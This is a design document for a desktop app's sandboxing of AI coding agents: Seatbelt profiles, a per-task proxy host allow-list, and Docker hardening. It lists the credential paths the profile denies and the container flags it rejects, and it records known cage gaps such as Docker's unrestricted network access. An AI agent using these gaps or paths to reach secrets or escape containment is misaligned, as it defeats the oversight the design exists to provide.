# Sandbox

`src-tauri/src/sandbox.rs` + `TaskSandboxDialog`. Per-task macOS sandbox-exec (Seatbelt) + per-task in-process HTTPS CONNECT proxy (`src-tauri/src/proxy.rs`).

## Off macOS (Windows, Linux)

Seatbelt is macOS-only, so there the only sandbox is Docker mode. A stored
Seatbelt mode (a Mac teammate's committed `.termic.yaml`, a project default,
`--sandbox enforce` from the CLI) reads as **Off** everywhere:
`Task::effective_sandbox_mode` in Rust and `effectiveSandboxMode` in
`src/lib/types.ts`, keyed off `sandbox::available()` and `SEATBELT_AVAILABLE`.
Before that, such a task reached `pty_spawn`, `provision` failed, and it
spawned uncaged while the frontend counted it caged and turned YOLO on. The
pickers show only Off and Docker there. Windows specifics of Docker mode:
[windows.md](windows.md).

## Scope

ONLY the agent CLI's PTY is sandboxed. AuxTerminal, setup script, run script, and archive script run unsandboxed by design — they're user-authored shell needing full reach. The carve-out is enforced by not passing `task_id` in `pty_spawn` / routing scripts through `run_script` which never calls `sandbox::provision`.

## Modes (`SandboxMode`)

Four states, set per-task at create + editable later. `Enforce` is the full cage and is intentionally never weakened.

- **Off** — no cage.
- **Monitor** — allow everything, LOG every file op + network request.
- **Enforce** — full cage: seatbelt FS allow-list **and** network pinned to the loopback proxy.
- **EnforceFs** (serialized `"enforce-fs"`, UI "ENFORCING (FS)") — the **filesystem cage only**. Identical FS allow-list to `Enforce`, but the network sandbox is OFF: `render_profile` emits `(allow network*)` and `provision` starts **no proxy** (so `wrap_command` injects no `http_proxy`). For users who want write/read isolation but unrestricted egress (their own egress controls, VPN, non-HTTP traffic). UI consequence: every network surface is hidden in this mode (host allow-list field in both dialogs, "Blocked hosts" section + "+ domains" copy in the footer activity popover) — only FS rows show. YOLO auto-on (the FS seatbelt is still the real boundary), accent-colored shield.

## Layered model

1. `sandbox-exec -f <profile.sb>` — kernel seatbelt. Profile rendered to `$TMPDIR/termic-sandbox-<wsId>.sb`. A pure allow-list under `(deny default)`: reads and writes only where the profile carves them out (task + agent dirs, caches, system roots, runtime paths). Secrets (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.config/gh/hosts.yml`) are denied by never being on that list, so an entry that covers one (`$HOME`, say) re-exposes it. The Keychain IS on the list (`~/Library/Keychains`, and every `mach-lookup` is allowed) unless the task blocks it: see "Keychain" below. `(deny network*)` except loopback to the proxy — UNLESS `EnforceFs`, which emits `(allow network*)` instead.
2. Per-task **in-process CONNECT proxy** on an OS-assigned port (Rust thread inside Tauri binary). Regex hostname allowlist per CLI: claude→anthropic, gemini→google, codex→openai, muse→meta (`api.meta.ai` for both the Model API and the release channel, `auth.meta.com` + `accountscenter.meta.com` for the device-code login, `lookaside.facebook.com` for the launcher's binary download, so a blocked self-update reads as a stale version), devin→devin.ai + codeium (`api.devin.ai` for the API, `cli.devin.ai` for installs/updates, `app.devin.ai` for the web UI, plus the Codeium-lineage telemetry hosts the binary still dials: `server.codeium.com`, `unleash.codeium.com`, `*.sentry.io`, `openrouter.ai`) + baseline (github, gitlab, azure devops + its Entra token endpoint + the ARM host `az login` finishes through, npmjs, pypi, crates.io, CA OCSP) + task extras. Non-matching → HTTP 403. Stopped via `SandboxBundle::Drop` on PTY teardown. **Not started in `EnforceFs`** (no network sandbox).

## Key behaviors

- **Pinning**: `Task.sandbox_enabled` captured at create time. Edit later via `task_set_sandbox`, which persists AND SIGKILLs every live PTY (otherwise the running process holds the old profile). `TaskSandboxDialog` warns before save.
- **YOLO interaction**: spawn passes `yolo_args` when `isTaskCaged(task) || task.yolo` (`TerminalPane.tsx`), so a caged task (Enforce, EnforceFs, Docker) always gets them and the seatbelt is the real boundary. `Task.yolo` is per task (the global toolbar toggle was removed in 76953ad); the sidebar row shows a red `Zap` for YOLO without a cage. **Default for new tasks**: Settings → Sandbox "Start new tasks in YOLO" (`prefs.defaultYolo`), overridable per project (`Project.default_yolo`, personal only, never `.termic.yaml`). It only SEEDS `Task.yolo` at create, through `projectYoloDefault` + `yoloForCreate` (`src/lib/projectSandboxDefault.ts`): the New Task dialog shows it as a checkbox before Create (unticked, with the reason, when the first message came from a deep link or an issue, since someone else wrote it), the Race dialog seeds its own, and the sidebar + menu applies it with a `quick-create-yolo-note` saying so. It never reaches the CLI or MCP: `termic new` still needs an explicit `--yolo`, because an agent asking to run `termic new x` would otherwise spawn an agent that approves everything behind an approval prompt that looks harmless (see "Settled" below). For codex and muse the flag also turns off the agent's OWN sandbox, not just its prompts.
- **Muse Code brings its own seatbelt, and the two never nest.** Muse wraps its shell tool with `/usr/bin/sandbox-exec` itself (confirmed in the 1.0.2 binary: `macos_seatbelt`, `command wrapped with fixed macOS sandbox-exec path`) and turns it on by default, alongside its own tool-approval prompt. That would be a sandbox inside a sandbox except for the YOLO rule above: `isTaskCaged(task) || task.yolo` means a caged muse task ALWAYS gets `--yolo`, whose own description is "disable approval and sandboxing and trust this workspace for this run". So a caged task runs muse's cage off and termic's on, and an uncaged task runs muse's own, unnested. Neither combination stacks two profiles. If a future muse build stops accepting `--yolo`, this is the assumption that breaks, and the symptom would be muse's shell tool failing rather than anything termic reports.
- **Scheduled runs inherit their parent's cage** (GH #300): a run is created with the parent task's Seatbelt mode and allow-lists, explicitly, through `runSpecFromParent` (docs/data-model.md, "Recurring schedules"); nothing else inherits a sandbox. A run writes its report into `<project>/.termic/schedules/<slug>/`, inside the main checkout that is the run's task dir, so the write is allowed in every Seatbelt mode. Docker is refused: a schedule cannot be created on a Docker task, and a parent switched to Docker afterwards gets a failed slot, never a run on the host.
- **Default sets** baked into Rust (`builtin_rw_paths`/`builtin_deny_paths`, per-CLI `render_filter` in `sandbox.rs`). Project `sandbox_*` fields are extras only, seeded at task creation.
- **The config sync clone is inside the deny.** `<global_dir>/sync/` (config_sync.rs) holds the user's whole setup and a remote they can push to, so it lives under the data dir the final Seatbelt rule denies, and Docker mounts only named subfolders (`docker-agents/`, `docker-forge/`, `docker-gitfiles/`), never the data dir or `sync/`. Pinned by `config_sync::tests::the_clone_is_under_the_sandbox_deny` and `docker::tests::no_mount_reaches_the_config_sync_clone`. Anything that later mounts the data dir into a container has to keep `sync/` out. A user's extra mount cannot either: one whose host side resolves (symlinks followed, through a parent when the leaf does not exist yet) to the data dir or anything inside it is refused at save and skipped by `build_spec` (see "Per-task extra mounts" below). The sync's own git runs on the host, outside both cages, like every other git the app runs.
- **Recent denies**: `task_recent_denials(id, minutes?)` shells to `log show` filtered to task path + "deny". Surfaced in sandbox dialog under lazy `<details>`.
- **Live deny / access counters**: ONE app-wide `log stream` (`watch_task` in `sandbox.rs`) feeds the per-task trackers behind the deny popover and Monitor's activity view, however many sandboxed PTYs are open. Its predicate ORs the enforce clause (`Sandbox:` + `deny`) with the monitor clause (` allow ` + `file-`), and is system-wide, so every line is routed to a task by walking the pid's PPID chain (libproc, cached) up to a root `pty_spawn` registered with `register_root_pid`. Each `SandboxBundle` holds a `PathWatcher` handle, counted per task AND per mode, so a task left with a caged and a monitored agent (`task_set_sandbox` without restart) records both. The last one dropped kills the stream; a stream that dies on its own while handles remain is restarted, unless it died within 10s of starting. It used to be one stream per PTY with a `ps` per ancestry hop, see [performance.md](performance.md) bear trap 13. Known gap: the counters undercount. Of 60 denied writes fired 15s apart from one pane (each process alive 20s, ancestry verified), 3 were recorded. A raw `log stream` captured alongside saw only some of them and printed "Messages dropped during live streaming" dozens of times a minute, so live streaming sheds lines before termic sees them. Separately, a deny from a process that exited before its line was read can't be attributed: the ancestry walk needs the process alive.

## Docker sandbox (alternate mode, experimental)

`src-tauri/src/docker.rs` + Settings → Docker Sandbox (`DockerSection.tsx`) + `SandboxPicker.tsx` (`NewTaskDialog.tsx`, `TaskSandboxDialog.tsx`, and Settings → Sandbox, see "Unified picker" below). A mutually-exclusive alternative to Seatbelt: the agent CLI runs inside `docker run` instead, and can only touch what termic bind-mounts. See `docs/docker-sandbox/` for the full design + research.

- **Unified picker**: `SandboxPicker.tsx` renders FIVE peer cards - Off, Seatbelt's Enforcing (FS) / Monitoring / Enforcing, and Docker Container (its own full-width row, since it's a different cage MECHANISM, not another intensity level of Seatbelt's) - shared by `NewTaskDialog` (task creation), `TaskSandboxDialog` (editing an existing task), and Settings → Sandbox (the app-wide default, see below). This replaced an earlier two-tier design (an engine row, then a conditional Seatbelt submode grid underneath) once real usage showed Docker being reachable only from a second-level control read as an afterthought rather than a peer choice. `SandboxSelection` (`lib/types.ts`: `SandboxMode | "docker"`) is the flat type; `selectionFor(mode, dockerEnabled)` / `selectionToFields(selection)` convert to/from the SAME two independent backend fields (`sandbox_mode`, `docker_sandbox_enabled`) - still no new data model, just one picker instead of two, and `Docker` never gets a `monitor` submode of its own (there's nothing at the container level equivalent to Seatbelt's proxy/FS-op watcher to log). In `TaskSandboxDialog` the two engines keep their pre-existing, independent commit paths: Docker still commits IMMEDIATELY through its own confirm (`toggleDocker`/`task_set_docker`, always SIGKILLs), while Seatbelt stays a draft the Save button commits (`taskSetSandbox`/`task_set_sandbox`, restart-or-not choice) - `choose()` just decides which of the two a click should drive, rather than merging them into one commit; a Seatbelt card click there IS the final mode now (no separate submode step). Picking "Docker Container" always shows the `<u>network is unrestricted for now</u>` note (`DockerEngineNote`, same copy as Settings → Docker Sandbox) and, in the edit dialog, the "Preview command" toggle. Every confirm that CROSSES the Docker boundary (`toggleDocker` in either direction, `leaveDockerFor`) also carries `SESSION_LOSS_NOTE`: an agent keeps its history inside the cage it ran in (`docker-agents/<agent>` in Docker mode, the real `~/.claude` outside it), so the tab's stored session id names a conversation only one of the two stores has heard of, the post-switch `--resume` finds nothing, and `TerminalPane`'s `failedResume` path relaunches fresh. Nothing is deleted and nothing carries over, and the confirm is the last moment anyone can be told. A Seatbelt-to-Seatbelt mode change does NOT carry it, because that keeps the same store.
- **App-wide default**: Settings → Sandbox's "Sandbox new tasks by default" is the SAME `SandboxPicker`, backed by `usePrefs().globalDefaultSandboxKind` (a `SandboxSelection`, localStorage-only - never Rust-persisted). Used by `NewTaskDialog` as the last fallback when seeding a new task's selection: last-used habit (`newTaskLastSandboxMode`, now also tracks `"docker"`) → the project's own `default_sandbox_mode`/`default_sandbox` (still Seatbelt-only - a project can't default new tasks to Docker yet) → this app-wide pick. Migrated automatically from the old boolean `globalDefaultSandbox` pref the first time it's read (`true` → `"enforce"`, `false` → `"off"`) - the new key wins once it exists, so the migration runs at most once per browser profile.
- **Docker's own status icon**: `DockerSandboxIcon` (`SandboxIcon.tsx`, next to `SANDBOX_VISUALS`/`SandboxIcon`) is a `Container` glyph colored `DOCKER_SANDBOX_COLOR` (`var(--color-ok)`) - the same green Seatbelt's `enforce`/`enforce-fs` use, since Docker mode IS a real filesystem cage too, just via a different mechanism. (An earlier version used the warning red `--color-err` on the mistaken assumption it was already established for Seatbelt; that red is YOLO's "on but the cage isn't actually enforced" warning color and is unrelated to any sandbox mode's own identity.) Because Docker mode always stores `sandbox_mode` as `off` (mutually exclusive with Seatbelt), every surface that used to key off `effectiveSandboxMode(task) !== "off"` to decide whether to show a sandbox badge had to add an explicit `task.docker_sandbox_enabled` check FIRST - otherwise a Docker-sandboxed task showed no badge at all, reading as unsandboxed. Wired into the same four places `SandboxIcon` already appeared: the sidebar row badge + its task-menu item (`Sidebar.tsx`), the terminal footer chip (`TerminalPane.tsx`'s `FooterBar`), the top toolbar badge (`UnifiedBar.tsx`), and the command palette's "Sandbox settings" suffix (`CommandPalette.tsx`, text-only there - no icon to swap).
- **Sidebar row badge greys out when idle**: `SandboxIcon`/`DockerSandboxIcon` both take an `active` prop (default `true`, every other caller unaffected) - `false` forces the icon to the same faint gray as OFF regardless of mode, instead of its real color. Only the sidebar row's idle badge (`Sidebar.tsx`, `active={terminalTabs.length > 0}`) passes `false`; it used to show the mode's real color at reduced opacity whether or not the task had ever been launched, which read as "this task is actively caged" even for one sitting untouched. Fill (filled shield for `enforce`, outline for `enforce-fs`/`monitor`) still encodes the mode either way, so the two enforce modes stay distinguishable even gray. The YOLO-danger `Zap` badge in the same row is deliberately NOT included - it's a warning about a dangerous config, not a live status, so it stays red (just dimmer) even when idle.
- **YOLO auto-on covers Docker too**: `isTaskCaged(task)` (`lib/types.ts`) is `isSandboxEnforced(effectiveSandboxMode(task)) || task.docker_sandbox_enabled` - the single check every "is this task actually caged" call site now uses instead of the Seatbelt-only `isSandboxEnforced(effectiveSandboxMode(task))`. Needed because Docker mode always stores `sandbox_mode` as `off`, so the Seatbelt-only check alone can never see a Docker-sandboxed task as caged; before this fix, `--dangerously-skip-permissions` auto-on (`TerminalPane.tsx`'s spawn args and its live-toggle effect) and the sidebar's YOLO menu item (`Sidebar.tsx`) silently treated a Docker-caged task as uncaged. The drag-drop TMPDIR-staging workaround (`TerminalPane.tsx`, `sandboxed: () => isSandboxEnforced(...)`) deliberately still uses the Seatbelt-only check - it has no Docker equivalent.

- **Gating**: two switches AND together. `Settings.docker_sandbox_enabled` is the global master switch (Settings → Docker Sandbox); `Task.docker_sandbox_enabled` is the per-task pin, settable at CREATE time (`CreateTaskArgs`/`CreateMultiArgs`/`task_open_repo`/`task_import_worktree` all take it now) or later via `task_set_docker` (toggled from `TaskSandboxDialog`, mirrors `task_set_sandbox`'s SIGKILL-live-PTYs behavior, and rejects any `docker_extra_args` entry that could widen the cage: `--privileged`, `--cap-add`, `--network`/`--net`, `--pid`, `-v`/`--volume`/`--mount`, `--entrypoint`, `--user`, etc via `docker::validate_extra_args`). Mutually exclusive with Seatbelt at the DATA level, not just at spawn time: every creation path forces `sandbox_mode`/`sandbox_enabled` to off when `docker_sandbox_enabled` is true, so a task's stored fields never claim both cages are pinned on at once (`pty_spawn` also checks Docker FIRST as a second line of defense — when both happen to be on and an image is built, it skips the Seatbelt path entirely). If a task has `docker_sandbox_enabled` but the global switch is off, `pty_spawn` refuses the launch outright rather than silently falling through to an unsandboxed spawn, fail-closed.
- **Image**: one generic image for every agent, built from an editable Dockerfile (`docker_get_dockerfile` / `docker_set_dockerfile`, ships `src-tauri/assets/Dockerfile.default`). Content-addressed tag (`termic-sandbox:{hash}`) so an edit is detected as stale; build is a background action (`docker_build_image`, streams `docker-build://log` / `docker-build://done`) that never runs synchronously on the Rust spawn path (a multi-GB build would freeze the webview on that thread).
- **Rebuild nudge**: `Settings.docker_rebuild_frequency` (`off` / `daily` / `weekly`, default `daily`). Agents in the image are unpinned/always-latest (`Dockerfile.default`'s own header comment), so a cached rebuild is a no-op for freshness - a rebuild always runs `dockerBuildImage(true)` (`--no-cache --pull`, same as the manual "Update agents" button), never a cached build. `maybeRebuildDockerImageForLaunch` (`src/lib/dockerDailyRebuild.ts`) runs from the FRONTEND right before a Docker-mode task's agent spawns (`TerminalPane.tsx`, awaited before `ptySpawn`), and evaluates `isRebuildDue(frequency, lastBuiltDate)` against `docker::DockerImageStatus.last_built_date` (`docker.rs` records the local calendar date alongside the built tag; day-boundary math lives entirely in TS, unit-tested independent of IPC). Rather than silently rebuilding, it PROMPTS (`DockerRebuildPromptDialog`, resolved via `useUI().askDockerRebuild`) with "Rebuild now" / "Skip for now" and an inline frequency picker (`DockerRebuildFrequencyPicker`, shared with Settings → Docker Sandbox) so changing the cadence doesn't need a trip to Settings. "Skip for now" launches immediately on the existing image for someone in a hurry - it isn't sticky, so the next due launch prompts again. "Rebuild now" pushes an info toast, awaits the build, then a success/error toast; a failed rebuild toasts an error and still falls through to spawning with whatever image already exists rather than blocking the launch outright. Concurrent Docker-mode launches single-flight into one prompt/rebuild rather than opening two dialogs or racing two `docker build` calls for the same tag. Rebuilding the image is the ONLY thing that updates an agent CLI: every container runs with `--rm` (`render_argv`), so if an agent's own updater writes a new binary mid-session, that write lands in the container's throwaway layer, not the mounted per-agent config dir - the container is destroyed the moment its terminal closes and the next launch starts fresh from the image, silently reverting to whatever version was baked in at the last rebuild.
- **Mounts**: the worktree, its parent `.git` (worktree pointer resolution), composition members, and a persistent per-agent config dir under `<data_dir>/docker-agents/<agent_id>` (login + sessions + MCP config, shared across every Docker task of that agent, never the host's real `~/.claude` etc). NEVER mounts the whole container HOME (would shadow agent binaries baked in at build time).
- **Hardening**: every container runs with `--cap-drop ALL`, `--security-opt no-new-privileges:true`, and `--pids-limit 512` (rendered unconditionally in `render_argv`, before any task-supplied extra args).
- **Runs as the host user, not root**: `render_argv` adds `--user {host uid}:{host gid}` (`docker::host_uid_gid`, unix-only - `libc::getuid`/`getgid` on the HOST process, since it's the same user that already owns the worktree/agent-config-dir mounts, so ownership matches exactly with no chown needed; falls back to `0:0` on a non-unix build, where Docker mode isn't exercised yet). This exists because Claude Code refuses `--dangerously-skip-permissions` when the process is root - Docker-mode YOLO auto-on (see `isTaskCaged` above) was silently unusable for claude until this landed. `-u`/`--user` is in `UNSAFE_EXTRA_ARG_PREFIXES`, so a task can never override it via `docker_extra_args`. That host uid has no matching `/etc/passwd` entry inside the container, so `HOME=/root` and `USER=agent` are injected explicitly in `build_spec`'s env (every agent's config still lives under `/root`, unchanged - nothing moved to a uid-specific home) and `Dockerfile.default` runs `chmod -R a+rwX /root` at build time so that uid can read/write everything baked in there.
- **Known gap: network is unrestricted**. Seatbelt tasks get a per-task CONNECT-proxy host allowlist (`sandbox_allowed_hosts`); Docker mode never reads that list and `render_argv` emits no `--network` flag, so every Docker-mode container gets the default bridge network with unrestricted outbound access. A compromised agent in Docker mode can reach any host; the equivalent Seatbelt-enforced task cannot. The filesystem cage is real, the network cage is not (yet).
- **Activity monitor**: the host pid tree `procmon.rs` walks cannot see into a container - the pid it finds is the `docker run` client, which sits nearly idle regardless of how busy the agent is, because the real work happens inside the daemon's VM. `PtySlot.docker_container` (the `--name` from `DockerSpec`) lets `procmon_roots` mark which rows are Docker-sandboxed; `docker::merge_stats` (in `docker.rs`, run inside `procmon_start`/`procmon_sample`'s `spawn_blocking`, never on the IPC thread) then overwrites those rows with a single batched `docker stats --no-stream` query covering every live Docker task, and keeps its own cpu_pct history per row since the host-based numbers the platform sampler already baked in are the wrong ones. `ProcRow.is_docker` badges the row in the UI and explains why its `children` breakdown is always empty (the container's real process tree isn't visible from the host either).
- **Cleanup**: `docker::cleanup_task` runs on task archive and on every `task_set_docker` call (turning Docker off OR staying on but editing `extra_args`/`extra_mounts`) - the latter closes a gap where `kill_task_ptys` only kills the local `docker run` client (attached foreground, no `-d`), never the container server-side, so the OLD container used to keep running until whatever tab this was happened to respawn on its own (which triggers `pty_spawn`'s own pre-spawn `cleanup_task`, belt-and-suspenders for exactly this). `docker::cleanup_all` runs on app quit AND on app startup (same reasoning: a crash or force-quit doesn't stop an attached container either, so a previous session's abandoned containers are reaped as soon as the next launch's `.setup()` runs, before anything in this session could plausibly own one).
- **Agent support**: `agent_config()` in `docker.rs` maps agent id → container config-dir wiring, deriving its mount paths from `agent_dirs::state_dirs()` (`src-tauri/src/agent_dirs.rs`) rather than its own hardcoded table - that module is the single source for "where does this agent's state live", shared with Seatbelt's default `sandbox_allowed_paths` (`default_agents()` in `lib.rs`) so the two don't hand-maintain separate copies that can drift. Docker's set is the CONFIRMED-state subset of what Seatbelt allows: Seatbelt additionally allows macOS-only extras (`Library/Application Support/*`, defensive XDG paths, claude's regex-covered sidecar files) that have no Docker-container equivalent and stay hand-authored in `default_agents()`. grok is deferred in Docker regardless of what `agent_dirs` lists for it (binary + skills + config all live under `~/.grok` with no clean relocation env, see `docs/docker-sandbox/findings.md`) — a grok login done inside a Docker task is lost on the next container run, since no persistent config dir is mounted for it. devin is deferred for the same shape of reason: its versioned CLI binaries live under `~/.local/share/devin` next to `credentials.toml`, so mounting that directory to keep the login would shadow the binary the image baked in.
- **gh / glab inside the container**: `Dockerfile.default` installs both CLIs (gh from its official apt repo; glab from the latest release `.deb`, resolved through the GitLab API and deliberately NON-FATAL so a JSON-shape change cannot fail the build and with it every Docker task), and bakes `credential.https://github.com.helper = !gh auth git-credential` (plus the gist and gitlab.com equivalents) into the image's `/root/.gitconfig` so `git push` over HTTPS works the moment `gh auth login` does. `gh auth setup-git` would write that same config into the container's throwaway layer and have to be re-run in every single container. The Azure DevOps CLI is deliberately NOT baked in (`az` is a heavyweight Python install; a user who wants it adds it to the Dockerfile's editable region), but `.azure` is already in the shared config dirs below, so an `az login` / `az devops login` run inside a container persists the same way. One hole worth knowing: `az` has no `auth git-credential` equivalent, so `az`-authenticated containers can run `az devops`/`az repos` but CANNOT `git push` to an HTTPS `dev.azure.com` remote - SSH remotes push fine. A related shadowing gotcha: `AZURE_CONFIG_DIR=/root/.azure` relocates `cliextensions/` under the mounted dir too, so an `azure-devops` extension baked at IMAGE BUILD time lands in `/root/.azure/cliextensions` and is then SHADOWED by the empty shared mount - install the extension at RUNTIME (`az extension add --name azure-devops` inside a container once; it writes into the shared dir and persists). A Dockerfile saved before this shipped has neither CLI, so Settings → Docker Sandbox flags it (keyed on the `cli.github.com` apt line) and points at "Reset to default". **How "customised" is decided changed, because the obvious way is wrong.** It used to be `saved == DEFAULT_DOCKERFILE`, which answers a different question: the moment termic ships a new default (adding an agent to it), every untouched Dockerfile reports as the user's own work and the only remedy offered is "Reset to default" - the one button someone who genuinely customised theirs must not press. Provenance is stored instead, in `Dockerfile.origin` beside the file: the generation and the shipped default it was written FROM. A saved Dockerfile still equal to its recorded origin was never edited, whatever today's default says, so `read_dockerfile` upgrades it in place and a customised one is left alone. `DOCKERFILE_GENERATION` is the blunt instrument for a release where an old file cannot be left behind at all (a broken base image, a security fix): bumping it sweeps EVERY saved Dockerfile back to the shipped default, edits included. Generation 1 is the introduction of the mechanism, since a profile predating it has no way to tell an edit from an older termic's write.
- **Your git identity**: the container has no `~/.gitconfig` of yours, so before this a commit made inside one failed with "Author identity unknown. *** Please tell me who you are." and had to be answered with `git config` again, in every container, forever. `build_spec` step 4d reads the identity the host would use *for that worktree* (`git -C <task path> config --get user.name` / `user.email`, repo-scoped so git resolves the whole chain, including an `[includeIf "gitdir:~/work/"]` block that a read of `~/.gitconfig` alone would miss), writes the two keys to `<data>/docker/gitconfig/<task id>` (one file per task, because two tasks can legitimately resolve different identities; temp + rename, so a container starting for one tab cannot read the file another tab's spawn is writing), and bind-mounts it READ-ONLY at git's XDG global config path. Nothing is mounted when the host has no identity.

  Two placements were rejected, and both are worth knowing because each is the obvious thing to try. Mounting the host's `~/.gitconfig` at `/root/.gitconfig` **shadows the image's own**, taking out `safe.directory = *` (without which git refuses every command in the bind-mounted worktree as "dubious ownership") and the gh/glab credential helpers in one go, and it drags `commit.gpgsign` and `credential.helper = osxkeychain` into a container that has neither. Injecting `GIT_AUTHOR_*` / `GIT_COMMITTER_*` env is less code and silently WRONG: env outranks repo-local config, so it rewrites the identity of every repo that deliberately sets its own. The XDG file is read at the GLOBAL level, which is below the repo's `.git/config` (mounted, step 2) and below the image's `~/.gitconfig` for any key that file sets, and it sets no `user.*`. Verified in the real image: with a repo-local `user.email`, the commit is attributed to the repo's, and without one, to the host's. One diagnostic trap, confirmed against the shipped image (git 2.39.5): `git config --list --global` does NOT list this file, only `~/.gitconfig`, despite `--global` being documented as reading both for read operations. Someone checking that way sees the image's four baked entries and concludes the identity never arrived. `git config --list --show-origin | grep user\.` and `git config --show-origin --get user.email` both show it, and name the file the value came from. Two visibility rules go with it, because a mount nobody can see is a mount nobody can audit. The read falls back to the HOME dir when the task path is not a directory, which is what makes the line appear in the SETTINGS-level command preview at all: that panel builds from `sample_preview_task()`, whose path is a deliberate placeholder, and it promises the reader that everything but the worktree path is what a real launch uses. And when no identity resolves from either place, `spec.warnings` gets the "No git identity found on this Mac" line, so the one case this feature cannot rescue says so in the preview instead of surfacing later as the agent's first commit failing. The XDG root follows a per-agent `XDG_CONFIG_HOME` when an agent sets one (git looks wherever that points, so a file at the default path would never be read), and the resulting target still goes through `persist_target_allowed`, so an `XDG_CONFIG_HOME` of `/etc` mounts nothing.

- **Shared config dirs**: `Settings.docker_shared_config_dirs` (Settings → Docker Sandbox → "Persisted directories & environment" → the **All agents** row at the top of the same list, seeded by `docker::default_shared_config_dirs` with `.config/gh` + `.config/glab-cli` + `.azure`). It lives IN that list rather than in a section of its own: "shared config dirs" and "persisted directories" were two names for one mechanism differing only in axis, and a reader had to work that out. Same chip UI (`DirChips`, shared with the per-agent rows so the two cannot drift into looking like different features), same patch-on-change save, no environment column because env is per agent by definition.

  The list itself is container dirs mounted into EVERY container, for every agent, from one host dir each under `docker::forge_config_host_dir()` (`<data>/docker-forge/`, host layout mirroring the container path). `build_spec` step 4b runs each entry through the same `sanitize_extra_dir` the per-agent list uses, and sets a config-dir env var when it recognises the CLI (`GH_CONFIG_DIR` / `GLAB_CONFIG_DIR` / `AZURE_CONFIG_DIR`, keyed on the entry's BASENAME so moving gh's dir still points the var at wherever it landed). This is the opposite axis to the per-agent rows beneath it: what goes here belongs to the USER, not to an agent vendor. A GitHub token is the same token whichever agent pushes with it, and a per-agent copy would mean logging in once per agent AND once per clone of one. The dirs start EMPTY, so nothing crosses from the Mac until someone runs `gh auth login` inside a container; both CLIs fall back to a plaintext token file when no keyring is reachable, which is the case in the image, so that login is what survives `--rm`. A user who lists `.config/gh` in an agent's own extra dirs keeps the per-agent mount instead: the explicit choice outranks the shared default, and the env var still names the same container path.

  **Not a mount of `/root/.config`.** Nesting would work (Docker orders mounts by destination depth, so a per-agent `.config/opencode` still applies underneath a blanket mount, verified), but an empty dir over the whole tree SHADOWS what the image put there at build time (`/root/.config/fish/completions/grok.fish` today, whatever an unpinned installer drops there next) — the exact failure `agent_dirs.rs` documents for grok — and it would pool every credential any agent ever created into one directory every other agent reads. One named dir at a time, each a deliberate choice.

  The host's real `~/.config/gh` is never mounted, for three independent reasons: on macOS gh keeps the token in the Keychain (`hosts.yml` holds no `oauth_token` at all), so the mount would hand the container an unauthenticated gh; a container-side `gh auth logout` would take out the login `forge.rs` runs termic's own PR panel on; and Seatbelt hard-denies that same file, so mounting it here would make the container the looser of the two cages.
- **Dropped and pasted files**: `build_spec` step 4c mounts `crate::attachments_dir()` (`$TMPDIR/termic-attachments`) READ-ONLY at the IDENTICAL absolute path, same convention as the worktree. Two gestures share it. A file DROPPED on a terminal lives somewhere no cage can read (Seatbelt hard-denies ~/Desktop and friends; a container simply has no such path), so `terminal_stage_file` copies it in and the staged path is what gets typed - `TerminalPane` now gates that on `isTaskCaged`, not `isSandboxEnforced`, because a Docker task used to get the raw path inserted and every read of it failed. An image PASTED into a terminal cannot reach the agent as text at all: xterm.js sends only bytes it was given down the PTY, and the agent inside the container is a Linux process whose own clipboard reader shells out to xclip / wl-paste with no route to the Mac's pasteboard, so ⌘V with a screenshot silently did nothing. So `clipboard_image_save` writes the bytes there and `TerminalPane`'s capture-phase `paste` listener sends that path instead, escaped by the same `shellEscapePath` a drop uses. See [ipc.md](ipc.md).

  **DOCKER ONLY, and it is a PASTE rather than typed bytes.** Both halves were measured, not assumed. Outside a container the agent reads the Mac clipboard ITSELF (`osascript -e 'the clipboard as «class PNGf»'`) and gets the real image unaided, so intercepting there would hand it a file path where it used to get an image - `TerminalPane`'s listener reads the LIVE task and returns immediately unless `docker_sandbox_enabled`. And the path goes through `term.paste()`, not `ptyWrite`: driven against claude's own TUI, a TYPED path is echoed as literal text, while the identical string delivered as a paste (xterm wraps it in `\x1b[200~`/`\x1b[201~` when the agent has bracketed paste on) makes claude read the file and render `[Image #1]`, the same attachment a native paste produces. So the agent inside the cage ends up holding the actual image, not a path to talk about. **ctrl+V is handled too, and separately.** It is not a paste event at all - on macOS it is byte `0x16` down the PTY, and it is the gesture claude binds its own image-attach action to, which inside a container always answers "no image in clipboard" (a Linux process asking xclip about a pasteboard that is not there). For a Docker task `TerminalPane` swallows it, reads the Mac pasteboard natively (`clipboard_image_capture`, see [ipc.md](ipc.md)) and pastes the saved path; when the clipboard holds no image it forwards the original `0x16` so the agent answers for itself, and outside Docker the branch never runs. The dropped-file path still writes raw bytes, so a dropped IMAGE lands as a path either way; giving drops the same treatment would change behaviour for uncaged terminals too, which is a separate decision.

  The location is the load-bearing part, and it is NOT the app data dir: the Seatbelt profile ends with a final, last-match-wins `(deny file-read* (subpath <data_dir>))` protecting the CLI token, so a pasted image there would be unreadable in the mode most tasks run under. `/private/var/folders` is already on `builtin_runtime_paths`. It is canonicalized for the same reason it is mounted at the same path both sides: `/var` is a symlink to `/private/var`, and the Seatbelt rule, the Docker mount and the text typed at the prompt all have to name one string.

- **User-added extra dirs**: `Settings.docker_agent_extra_dirs` (Settings → Docker Sandbox → "Per-agent config dirs", collapsed by default) lets a user append extra dirs to mount alongside `agent_dirs::state_dirs()`'s built-in list - e.g. a custom skills dir or an MCP server's own state dir. `docker::sanitize_extra_dir` rejects anything absolute or containing `..` before it can become a mount target (a raw `/root/{entry}` concatenation would otherwise let a stray `../../etc` resolve outside `/root`). Read + write both go through the normal `docker_agent_dirs` (read: builtin + extra + `is_builtin`/`persist_offerable`/`persist_enabled`, one row per REGISTERED agent, not just the known-safe ones) / `settings_save` (write: patches the map directly, no separate command) path - the built-in list itself is never editable.
- **A capture-resume agent's session id in Docker**: `post_launch_capture` runs on the HOST (`run_capture_command`), and for a Docker task that is the wrong machine. The agent wrote its sessions inside the container, into `/root/.local/share/<agent>`, which is bind-mounted from `docker-agents/<agent>/local/share/<agent>`; left alone the command reads the user's own `~/.local/share` and captures an id the container has never seen, so the next spawn resumes into the agent's own "no saved log" error. Reported on a Docker main-checkout muse task. `run_capture_command` therefore takes the agent id + a docker flag and points `XDG_DATA_HOME` at the mounted parent, so the same command is correct on both sides. Only the DATA root is remapped: an agent whose capture also reads its CONFIG dir is not covered, because the first state dir is mounted AT the agent root rather than under a config parent, so no single `XDG_CONFIG_HOME` resolves correctly and guessing one would point at a directory that exists and is wrong.
